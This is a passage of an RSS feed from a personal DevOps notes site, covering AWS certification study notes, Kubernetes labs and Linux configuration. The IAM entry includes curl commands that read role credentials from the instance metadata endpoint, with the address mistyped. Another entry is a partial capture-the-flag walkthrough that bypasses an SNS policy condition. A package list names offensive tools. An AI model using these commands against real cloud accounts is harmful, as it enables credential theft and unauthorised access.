snapshots can be encrypted Multi-AZ Databases are replicated to different AZs (subnets).</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/redshift/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/redshift/</guid><description>Redshift OLAP data housing service. Data is organized in columns.columns.
Basics advanced compresion doesn&amp;rsquo;t require indexes nor materialized views. massive parallel processing (MPP) columnar data storage (less I/Os) Cluster a single node has 160Gb a multi-node solution can be up to 128 nodes. Consists on a leader node and compute nodes. not multi-az. only available on 1 AZ. (Not available) Pricing billed per unit of process on a node on a hour not charged for the leader backups data transfer Encryption in-transit SSL.</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/route53/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/route53/</guid><description> Route53 Global AWS service Supports public and private Hosted zones Initial limit of 50 domain registration only Routing policies it basically supports:
simple routing Records that routes to something: MX, A, CNAME, TXT, etc. weighted routing basically splits traffic between targets based on a weight number (0-100) latency-based routing route53 automatically routes based on the origin&amp;rsquo;s response latency (ec2 or lb) failover routing a route53 healthcheck setup is needed works for DR environments two record sets is nedded, one primary and the other secundary geolocation routing based on the client&amp;rsquo;s region geolocation region locations has has to manually be configured in route53 geoproximity based on the geolocation of the aws resources multivalue answer routing basically multivalue servers to server a specific A dns record</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/s3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/s3/</guid><description>Simple Storage Service S3 Flat files storage service, object-based storage service. Not a block storage service.
Buckets Versioning Encryption Unlimited storage Lifecycle management Logging for accesses Host static web sites Buckets names are unique globally Supports ACLs and Torrent/BiTorrent Defaults By default a bucket is private By default up to 100 buckets are allowed Objects Obj properties: Key(obj name) and Value(bytes), version id, metadata. If the obj is deleted, it is not actually deleted instead a new version as deleted is created Restore an obj: remove the Marker delete obj version Each obj version has independent version on public property Objs size can be from 0b to 5TB.</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/security-group/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/security-group/</guid><description> Segurity groups A virtual firewall.
Basics Controls inbound and outbound traffic Inbound is blocked by default Outbound is allowed by default EC2: mutliple SGs can be assigned SGs are STATEFUL (ACLs are stateless) Best practices Don&amp;rsquo;t block specific ip address with SGs instead use NACLs</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/snowball/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/snowball/</guid><description>Snowball A powerfull compute box, similar like having an small AWS datacenter in a physicall box, it is a petabyte-scale data storage and transport. A Snowball edge can be installed on-premises, it is a up to 100TB data transport solution that finally goes to AWS S3. A snowballmobile is a truck with a bucn on snowball edges on it. It transfer up to 100PB of data.
Basically an import/export aws solution for on-premises.</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/sns/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/sns/</guid><description>SNS Simple notification service basics powerful notification system push-based service publish-subscribe (pub-sub) messaging paradigm. No periodically checks. integrations with aws autoscaling, email notif, SMS, HTTP Endpoints, etc. messages are stored reduntantly across different AZs message format for email is JSON Only works over HTTP topics where subscribers are grouped in order to get an identical copy of the message notification a single topic can support multiple endpoints for delivery such as iOS, android, SMS recipients, etc.</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/sqs/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/sqs/</guid><description>SQS First service ever on AWS. Distributeded queue system for messages between applications
Basics it is a PULL based system messages can contain up to 256 Kb of text on any format messages can be retrieved via AWS SQS API messages can be kept in queue from 1min to 14 days (default is 4days) autoscaling can be built into the service SQS guaratees that messages will be processed at leas once Supports dead-letter queue for not consumed?</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/storage-gateway/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/storage-gateway/</guid><description>AWS Storage Gateway An AWS service that allows on-premise network to direct connect with AWS (via AWS Direct Connect) and store data on different services, s3 or glacier.
Generalities It is runs a VM that can run on a VMWare/Hypervisor Provides local storage backed by S3/Glacier Used by DR environments Used by Cloud Migrations Types NFS (File Gateway) Can be stored on S3 via NFS/SMB Ownership, permissions and timestamps are preserved in s3 obj meta-data Supports native objects functionality (lifecycle, cross-region replication, etc) iSCSI (volumes gateway, non flat, block-based storage): for Operating Systems, DB engines.</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/swf/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/swf/</guid><description> Simple Workflow Service Basics task-oriented API, not like SQS which is a message-oriented API SWF ensures that tasks are assigned only once (not possible twices like SQS) SWF keps track of all events in an app (not like SQS, you need to implement your own app-level tracking) makes easy coordinations work between different componentes steps like: media processing, web app backends, business process workflows, analytics pipelines example: amazon shopping from order, cc check, ship order, completion and end needs workers and deciders (EC2 instances)</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-assoc/vpc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-assoc/vpc/</guid><description>VPC Basics supports hardware virtual private network VPN for on-prems datacenters limit of 5 VPCs by default components: igw or vpg (vpn) routing tables nACLs subnets vpc region 1 subnet = 1 AZ LAN options: 10.0.0.0 - 10.255.255.255 (10/8) 172.16.0.0 - 172.31.255.255 (172.16/12) 192.168.0.0 - 192.168.255.255 (192.168/16) Only 1 IGW per VPC ** SGs are stateful. NACLs are stateless. instead of a igw a NAT Instance (ec2) can be used or just a Nat gateway (EIP) network traffic logs can go to cloudwatch via VPC FLowLogs option enabled (not peered vpcs) vpc flow can be created at VPC, subnet and network intf levesl VPC endpoints can be enabled to allow internal aws ec2 instances to connect to other aws services (s3) vulnerability scans are not allowed, even on your own VPC when creating a vpc it by defaults create: ACL, SGs and a RT Egress-Only, allows vpc based ipv6 access to the internet, but prevents outisde ipv6 connections to the vpc Subneting on a VPC, the first 4 IP addrs and the latest one are reserved for AWS .</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-prof/aws-certification/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-prof/aws-certification/</guid><description> Associate arch plan and notes Check these: https://d0.awsstatic.com/training-and-certification/docs-sa-pro/AWS_certified_solutions_architect_professional_blueprint.pdf Resources to follow: http://aws.amazon.com/training/architect/ http://aws.amazon.com/whitepapers/ AWS training and certification AWS Training | Architecting Learning Path Consider for the exam AWS Services for build&amp;amp;deployments HA and Business continuity (DR) Security Networking Storage</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-prof/cognito/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-prof/cognito/</guid><description>Cognito Authentication &amp;amp; authorization
User management
Integration with Facebook, Google, &amp;hellip;
Also support unauthenticated users
Cognito (mobile/desktop client SDK) generates JWT that is sent to Cognito service which can be then used to auth to Facebook, Dropbox, Google, etc.
A cognito pool can assume a role or generate temporal aws credentials</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-prof/directory-service/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-prof/directory-service/</guid><description>Directory Service SSO / SAML 2.0 AWS can talk SAML2.0 from external IdPs if the SAML Assertion to be send to AWS is correct then AWS provides temporal AWS Creds (AWS STS) AD Federated users -&amp;gt; AWS SSO -&amp;gt; Dropbox, Slack, Salesforce&amp;hellip; or SAML Apps Ad Connector AD endpoints injected in a VPC via ENIs Uses an existing on-prem AD Multiple AD connections to speed and distribute load Requieres at least 2 subnets Supports network to VPN or Direct Connect Ideally works as PoC or backup for a Direct Connect Nothing is stored or acched, it just redirects AD traffic to on-prem AD servers Network becomes a single point of failure Microsoft Managed AD Microsoft 2012 R2 Managed using standard AD Tools Standard: 30k users, Enterprise: 5000k Users Radius-base MFA support By default support HA Support 1-way or 2-way trust (with on-prem) Supports AD Native scheme extensions Simple AD ?</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-prof/exam/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-prof/exam/</guid><description>AWS Exam Prep Solutions Architect Professional General knowledge from AWS needed:
Cloudformation
Hybrid scenario on-prem &amp;amp; cloud
Direct connect
AWS VPN
Migrations strategies:
snowball, site to site vpn, DX connections SMS &amp;amp; VM import/export database migrations strategies application migration service migration hub Cheapest and costly aws services
IAM
org level policies sts and iam scp vs iam policies Disaster recovery
RTO of 4 ? what does it mean? AWS Organizations</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-prof/iam/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-prof/iam/</guid><description> IAM curl http://169.256.169.254/latest/meta-data/iam/security-credentials whill show current role curl http://169.256.169.254/latest/meta-data/iam/security-credentials/$ROLE_NAME will give current security-credentials IAM Boundaries Denies the action if something is out of Boundaries A separated iam policy just to define Boundaries Policy evaluation top-down Explicit deny SCP Resource independent policies Session policies Identity policies Tips Invalidate existing sessions: Attach an iam role Apply a Revoke Policy based on a date (iam policy conditional)</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-prof/ram/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-prof/ram/</guid><description> RAM Resource Access Manager
Share AWS resources to different aws accounts No more of unneccesary vpc peerings Only owners of resources have ownership Can invite external organizations or local org accounts Invited cannot see who others are also part of the sharing resources Resources ids keep the same across aws accounts Invited has no ability to edit a shared resource</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-prof/s3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-prof/s3/</guid><description> S3 Accesses ACL for cross aws accts accs Bucket policy (cross acct and principal) IAM Role (cross acct). Single owner of bucket&amp;rsquo;s objects</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-prof/service-quotas/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-prof/service-quotas/</guid><description> Service Quotas IAM Users has a hard limit of 5000, cannot be created more users, customers are expected to host users outside if the quota is exceeded Usually default quotas are per region, pero account Quotas can be requested for increasal Monitoring and alerting can be setup for quotas AWS Organizations: Templates creation for child aws accounts</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-prof/vpc/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-prof/vpc/</guid><description> VPC In order to connect a VPC with on-prem: Direct Connect or VPC VPC supports dhcp service VPC supports DNS NTP support Route tables High CIDRS masks have high priority Stateless Need to specify ports in and out Stateful Automatically knows what port to use as return NACL 1 per subnet Stateless it is based on rules 1 acl can be used in multiple subnets SGs Allows only, it doesn&amp;rsquo;t deny A SG can be referenced to another SG A SG can be self-referenced</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-prof/vpn/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-prof/vpn/</guid><description> VPN Site-to-site VPN Connects a VPC with on-prem subnets VGW -&amp;gt; CGW, has HA by default Works for 1.25 Gbps Costs per each Gb out/in Considered as backup of Direct Connect, means, not stable Accelerated site to site 2 IPSec Global accleration underneath Can be used only if TWG is used BGP AS / ASN It is a routing protocol BGP vs eBGP Global Accelerator Anycast ip addresses Less routers hops to reach AWS Network Works with TCP and UDP At Network Level (OSI)</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-prof/well-architected-framework/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-prof/well-architected-framework/</guid><description>Well architected framework The framework Collection of best practices and architectural definitions to provide a well designed cloud infrastructure based on the 5 pillars: operational excellence, security, reliability, performance efficiency and cost optimization.
Generalities design principles stop guessing your capacity needs test systems at prod scale automate to make architectural experimentatino easier allow for evolutionary architectures data-driven architecures improve through game days (I) Operational excellence (II) Security Design principles Apply security at all layers (acls, sgs, ec2) Enable traceability (cloudtrail) Automate response to security events (SNS, brute-forces) focus on securing your system automate security best practices (hardened amis) Definitions data protection Data should be segmented and classified so certain data can be only accesible by certain group of persons and no others.</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-prof/workspaces/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-prof/workspaces/</guid><description> Workspaces Desktop as a service Montly and hourly payment Ad simple and Ad connector integration for User management Has its own ENI in a VPC It can connect to FSX and/or EFS Access to on-prem via VPC or Direct connect Runs on AWS Managed VPC It can connect to on-prem managed network It is not HA It only work with an existing directory service (Active Directory)</description></item><item><title/><link>https://www.darvein.net/devops/aws/aws-sa-prof/written-notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/aws-sa-prof/written-notes/</guid><description> Written notes &amp;#x1f4cc; Notes from Cantril
&amp;#x1f4cc; What I&amp;rsquo;ve missed in the exacm &amp;#x1f4cc; More references
https://github.com/acantril/aws-sa-pro https://github.com/Ernyoke/certified-aws-solutions-architect-professional</description></item><item><title/><link>https://www.darvein.net/devops/aws/awsiam-challenge/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/awsiam-challenge/</guid><description>AWS IAM Challenge challenge 1 All you need to is to use awscli to navigate a S3 Bucket:
aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt -
challenge 2 In order to pass this one you just need to pull messages from the queue:
aws sqs receive-message \ --queue-url https://sqs.us-east-1.amazonaws.com/XXXXX/XXXXX challenge 3 This policy is given, we just need to subscribe to the SNS topic and bypass the condition which is *@tbic.wiz.io.
{ &amp;#34;Version&amp;#34;: &amp;#34;2008-10-17&amp;#34;, &amp;#34;Id&amp;#34;: &amp;#34;Statement1&amp;#34;, &amp;#34;Statement&amp;#34;: [ { &amp;#34;Sid&amp;#34;: &amp;#34;Statement1&amp;#34;, &amp;#34;Effect&amp;#34;: &amp;#34;Allow&amp;#34;, &amp;#34;Principal&amp;#34;: { &amp;#34;AWS&amp;#34;: &amp;#34;*&amp;#34; }, &amp;#34;Action&amp;#34;: &amp;#34;SNS:Subscribe&amp;#34;, &amp;#34;Resource&amp;#34;: &amp;#34;arn:aws:sns:us-east-1:123123123123:TBICWizPushNotifications&amp;#34;, &amp;#34;Condition&amp;#34;: { &amp;#34;StringLike&amp;#34;: { &amp;#34;sns:Endpoint&amp;#34;: &amp;#34;*@tbic.</description></item><item><title/><link>https://www.darvein.net/devops/aws/cloudwatch/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/cloudwatch/</guid><description> AWS Cloudwatch # insights LE dry-run fields @timestamp, @logStream, @message | filter @message like /The dry run was successful/ fields @timestamp, @logStream, @message | filter @message like /The following errors were reported by the server/ fields @timestamp, @logStream, @message | filter @message like /ALB is not ready after 200 tries/ # insights LE real fields @timestamp, @logStream, @message | filter @message like /Your certificate and chain have been saved at/ fields @timestamp, @logStream, @message | filter @message like /unauthorized/ fields @timestamp, @logStream, @message | filter @message like /Exception/</description></item><item><title/><link>https://www.darvein.net/devops/aws/notes/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/notes/</guid><description> AWS Notes Useful links AWS IAM Generator and Info: https://www.awsiamactions.io/</description></item><item><title/><link>https://www.darvein.net/devops/aws/s3/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/aws/s3/</guid><description>S3 Bucket S3 Bucket, (0) it exists you have permissions, http404 doesn&amp;rsquo;t exist, http403 it exists but you don&amp;rsquo;t have permissions aws s3api head-bucket --bucket $BUCKET_NAME</description></item><item><title/><link>https://www.darvein.net/devops/devops-interviews/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/devops-interviews/</guid><description>Devops Interviews I&amp;rsquo;m writing down for the first time the pattern I&amp;rsquo;ve found across all my interviews &amp;#x1f44d;
Currently this document is a Draft, I will keep updating this while I remember all my interview cases.
Your introduction Here you already have to have a prepared introduction, you will not be interrumped, so you will have to memorize it.
Here some key points for your introduction:
What is your name, your career, where are you from?</description></item><item><title/><link>https://www.darvein.net/devops/k8s/labs/daemonset/daemonset/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/k8s/labs/daemonset/daemonset/</guid><description>Workload: Daemonset Deploying Resources Mysql ~z➤ k apply -f mysql.yml configmap/sql-create created secret/mysql-secret created service/mysql-service created statefulset.apps/mysql created Backend ~z➤ k apply -f backend.yml deployment.apps/backend-deployment created service/backend created ~z➤ k get pods NAME READY STATUS RESTARTS AGE backend-deployment-6b77dc6779-5rznl 0/1 Init:1/2 0 2s mysql-0 1/1 Running 0 2m22s ~z➤ k get pods NAME READY STATUS RESTARTS AGE backend-deployment-6b77dc6779-5rznl 1/1 Running 3 (33s ago) 3m8s mysql-0 1/1 Running 0 49s Frontend ~z➤ k apply -f frontend.</description></item><item><title/><link>https://www.darvein.net/devops/k8s/labs/deployment/deployment/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/k8s/labs/deployment/deployment/</guid><description>Workload: Deployment Testing two docker images # Build the apps ~➤ docker build -t backend . ~➤ docker build -t frontend . # Run the apps ~z➤ docker network create dummy ~z➤ docker run --network dummy -p 3000:3000 --name backend backend # Tag and publish to docker hub docker tag backend darvein/bapp:v1 docker tag frontend darvein/fapp:v1 docker push darvein/bapp:v1 docker push darvein/fapp:v1 Deploy both apps in k8s ~z➤ kubectl apply -f backend.</description></item><item><title/><link>https://www.darvein.net/devops/k8s/labs/jobs-cronjobs/daemonset/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/k8s/labs/jobs-cronjobs/daemonset/</guid><description>Workload: Daemonset Deploying Resources Mysql ~z➤ k apply -f mysql.yml configmap/sql-create created secret/mysql-secret created service/mysql-service created statefulset.apps/mysql created Backend ~z➤ k apply -f backend.yml deployment.apps/backend-deployment created service/backend created ~z➤ k get pods NAME READY STATUS RESTARTS AGE backend-deployment-6b77dc6779-5rznl 0/1 Init:1/2 0 2s mysql-0 1/1 Running 0 2m22s ~z➤ k get pods NAME READY STATUS RESTARTS AGE backend-deployment-6b77dc6779-5rznl 1/1 Running 3 (33s ago) 3m8s mysql-0 1/1 Running 0 49s Frontend ~z➤ k apply -f frontend.</description></item><item><title/><link>https://www.darvein.net/devops/k8s/labs/minikube/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/k8s/labs/minikube/</guid><description>Installing minikube Needed packages: - minikube: For installation follow instructions: https://minikube.sigs.k8s.io/docs/start/ - most package managers have a binary ready to be installed on your system. - vagrant
Star up k8s cluster with minikube:
➤ minikube start --driver=virtualbox 😄 minikube v1.31.2 on Arch ✨ Using the virtualbox driver based on user configuration 💿 Downloading VM boot image ... E1005 17:51:25.025455 4640 iso.go:90] Unable to download https://storage.googleapis.com/minikube-builds/iso/16971/minikube-v1.31.0-amd64.iso: getter: &amp;amp;{Ctx:context.Background Src:https://storage.googleapis.com/minikube-builds/iso/16971/minikube-v1.31.0-amd64.iso?checksum=file:https://storage.googleapis.com/minikube-builds/iso/16971/minikube-v1.31.0-amd64.iso.sha256 Dst:/home/n0kt/.minikube/cache/iso/amd64/minikube-v1.31.0-amd64.iso.download Pwd: Mode:2 Umask:---------- Detectors:[0x55fe4cb8b640 0x55fe4cb8b640 0x55fe4cb8b640 0x55fe4cb8b640 0x55fe4cb8b640 0x55fe4cb8b640 0x55fe4cb8b640] Decompressors:map[bz2:0xc0005d3360 gz:0xc0005d3368 tar:0xc0005d3310 tar.</description></item><item><title/><link>https://www.darvein.net/devops/k8s/labs/statefulset/statefulset/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/k8s/labs/statefulset/statefulset/</guid><description>Workload: Statefulset Testing two docker images # Build the apps docker build -t backend . docker build -t frontend . # Tag and publish to docker hub docker tag backend darvein/bapp:v1 docker tag frontend darvein/fapp:v1 docker push darvein/bapp:v1 docker push darvein/fapp:v1 Deploy both apps in k8s First create the SQL file as configmap:
k create configmap mysql-initdb-config --from-file=init-db.sql # Create the Mysql service k apply -f mysql.yml k apply -f backend.</description></item><item><title/><link>https://www.darvein.net/devops/k8s/network/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/k8s/network/</guid><description>Network, Ingress, Services, etc Content Network, Ingress, Services, etc Content Pods Networking Network policies for Pods: DNS Services Ingress Gateway API Pods Networking We can bootstrap kuberentes via minikube with these configs:
minikube start \ --memory=8192 --cpus=4 \ --nodes=3 \ --driver=virtualbox \ --network-plugin=cni --cni=calico \ --feature-gates=JobPodFailurePolicy=true,PodDisruptionConditions=true \ --insecure-registry &amp;#34;registry.local:5000&amp;#34; \ --container-runtime=docker \ --service-cluster-ip-range=10.96.0.0/12 \ --extra-config=controller-manager.cluster-cidr=10.244.0.0/16 \ --extra-config=controller-manager.node-cidr-mask-size-ipv4=24 Highlights:
cluster-cidr: CIDR where pods will be deployed service-cluster-ip-range: ClusterIP for services Kube-proxy on each node receives traffic from the service-cluster-ip-range and forwards to the backend pods.</description></item><item><title/><link>https://www.darvein.net/devops/k8s/security/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/k8s/security/</guid><description>Kubernetes security In a nutshell these are the most important aspects to consider:
Cloud security Cluster security Network security Container security Secrets Management Cloud security The documentation mention the 4Cs:
Cloud: best practices Cluster: control plane protection, encryption, security policies Container: image scanners, pod security Code: dynamic attack testing, static analyzis In case of AWS what security involves:
IAM: users, groups, roles, policies Networking: VPC security-groups, NACLs, AWS Shield Data encryption: KMS, in-transit (tls/ssl, vpn) Monitoring and Logging: Cloudwatch , Cloudtrail Etc: Guarduty, AWS Config, SCPs Cluster Security Node security Some Node security best practices</description></item><item><title/><link>https://www.darvein.net/devops/k8s/storage/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/k8s/storage/</guid><description>Storage Volumes Containers state are ephemeral, once the container is terminated then the Controller will recreate the container but data from the crashed/deleted container is lost. We can persist the container or containers data by using Volumes, but it will last only while the Pod is alive, once the Pod is eliminated then the volume is gone.
More references: kubectl explain pod.spec.volumes Pod have shared filesystem so all containers can share the files with a volume Ephemeral Volumes: emptyDir, configMap, secrets Persistent Volumes: hostPath, local, ebs (aws), etc Mount propagation: Which can be None, HostToContainer, Bidirectional.</description></item><item><title/><link>https://www.darvein.net/devops/k8s/workloads/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/k8s/workloads/</guid><description>Workloads Objects in kubernetes Pods have unique name All k8s objects have an UID labels and selectors to tag and organize objects, helpful from cli or UI. kubectl get pods -l environment=production,tier=frontend kubectl get pods -l 'environment,environment notin (frontend)' Recommended labels: app.kubernetes.io/name: mysql app.kubernetes.io/instance: mysql-abcxzy app.kubernetes.io/version: &amp;#34;5.7.21&amp;#34; app.kubernetes.io/component: database app.kubernetes.io/part-of: wordpress app.kubernetes.io/managed-by: helm Namespaces, are used as environments (useful to allocate users via Resource Quota) DNS when creating a service: &amp;lt;service-name&amp;gt;.</description></item><item><title/><link>https://www.darvein.net/devops/k8s2/k8s-doc/01.architecture/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/k8s2/k8s-doc/01.architecture/</guid><description>Kubernetes Architecture Kubernetes Components Master: Components:
API Server Cloud Controller (optional) Controller Manager Etcd Scheduler Nodes: Components:
Kubelet Kube-proxy This is where workloads are deployed and run.
Nodes have:
Status Heartbeats Node Controller (on control plane) Eviction Limits (?) Node topology Graceful node shutdown Kubelete and Kube-proxy are the components that interact with k8s API in control plane via HTTPS.
Other components of a Node:
Cgroupv2: based on linux cgroups Container Runtime: docker, runc?</description></item><item><title/><link>https://www.darvein.net/devops/k8s2/k8s-doc/02.workloads/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/k8s2/k8s-doc/02.workloads/</guid><description>Workloads https://kubernetes.io/docs/concepts/workloads/ All the different ways we have to run applications in kubernetes. The workloads.
These are:
Pods Deployments ReplicatSet StatefulSet DaemonSet Jobs CronJobs Pod These are ephimeral objects. Once stopped the storage is gone, the ip address is gone.
The different phase of a pod lifecycle are: Pending, Running, Succeeded, Failed and Unknown.
Also the container lifecycle phases: Waiting, Running, Terminated.
Here we can see all the Pod spec fields available:</description></item><item><title/><link>https://www.darvein.net/devops/k8s2/readme/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/k8s2/readme/</guid><description>Kubernetes Notes Index This repo contains my notes and laboratorious on Kubernetes.</description></item><item><title/><link>https://www.darvein.net/devops/linux/archlinux/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/linux/archlinux/</guid><description> Arch Linux Notes Notes when installing Arch Linux.
alias archinstall=&amp;#39;sudo yay -S&amp;#39; # Monitoring btop # Coding nvim # Multimedia pulsemixer # Others nerd-fonts redshift zplug zsh patat-bin lolcat glow gron ffmpegthumbnailer tumbler nomacs android-apktool jadx exploitdb evil-winrm mycli mediainfo pirate-get copyq Pip pipx install certipy-ad</description></item><item><title/><link>https://www.darvein.net/devops/linux/battery/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/linux/battery/</guid><description>Linux Battery Administration LTP LTP is one of the most commons to analyze and manage battery usage in a laptop computer.
yay -S ltp systemctl enable ltp
Here an config example for /etc/ltp.d/01-custom.conf
# TLP Configuration - Optimized for use with auto-cpufreq # Avoid changing CPU settings to prevent conflicts with auto-cpufreq # CPU_SCALING_GOVERNOR_ON_AC=performance # CPU_SCALING_GOVERNOR_ON_BAT=powersave # CPU_HWP_ON_AC=balance_performance # CPU_HWP_ON_BAT=balance_power # Disk Devices: Set disk APM level on battery to 128 and enable spin down after 10 seconds DISK_APM_LEVEL_ON_BAT=&amp;#34;128&amp;#34; DISK_IDLE_SECS_ON_BAT=10 # SATA aggressive link power management (ALPM): # min_power for battery, medium_power for AC SATA_LINKPWR_ON_AC=medium_power SATA_LINKPWR_ON_BAT=min_power # Runtime Power Management for PCI(e) devices RUNTIME_PM_ON_AC=on RUNTIME_PM_ON_BAT=auto # USB autosuspend feature USB_AUTOSUSPEND=1 # Disable Wake On LAN WOL_DISABLE=Y # Wi-Fi Power Saving mode: 1=disable, 5=enable WIFI_PWR_ON_AC=off WIFI_PWR_ON_BAT=on # Bluetooth power saving BLUETOOTH_DISABLE_ON_BAT=1 # Disable autosuspend for specified devices, e.</description></item><item><title/><link>https://www.darvein.net/devops/linux/iptables_tips/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/linux/iptables_tips/</guid><description>IPTables cheatsheet ## Centos 7 iptables systemctl stop firewalld systemctl mask firewalld systemctl enable iptables yum install iptables-services systemctl enable iptables systemctl [stop|start|restart] iptables chkconfig --level 345 iptables on iptables -L -n -v iptables -F service iptables save iptables-save ## FLUSH de reglas iptables -F iptables -X iptables -Z iptables -t nat -F iptables -L -n -v ## FLush rules on centos cat /etc/sysconfig/iptables iptables -F iptables -L service iptables save service iptables stop service iptables start cat /etc/sysconfig/iptables iptables -L ## Establecemos politica por defecto iptables -P INPUT ACCEPT iptables -P OUTPUT ACCEPT iptables -P FORWARD ACCEPT iptables -t nat -P PREROUTING ACCEPT iptables -t nat -P POSTROUTING ACCEPT ## Empezamos a filtrar # El localhost se deja (por ejemplo conexiones locales a mysql) /sbin/iptables -A INPUT -i lo -j ACCEPT # A nuestra IP le dejamos todo iptables -A INPUT -s 195.</description></item><item><title/><link>https://www.darvein.net/devops/linux/sudo-linux/sudo-linux-darvein/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://www.darvein.net/devops/linux/sudo-linux/sudo-linux-darvein/</guid><description>Sudo resume Sudo is a program that allow an user to run a command as another user, usually superuser sudo is not su, sudo requires user&amp;rsquo;s password sudo activities are logged in systemd (journalctl) By default sudo invocation rights last 5 minutes openbsd has doas, windows as runas /etc/sudoers Config file is located at /etc/sudoers. The tool visudo edits sudoers file in a safe manner: syntax check and 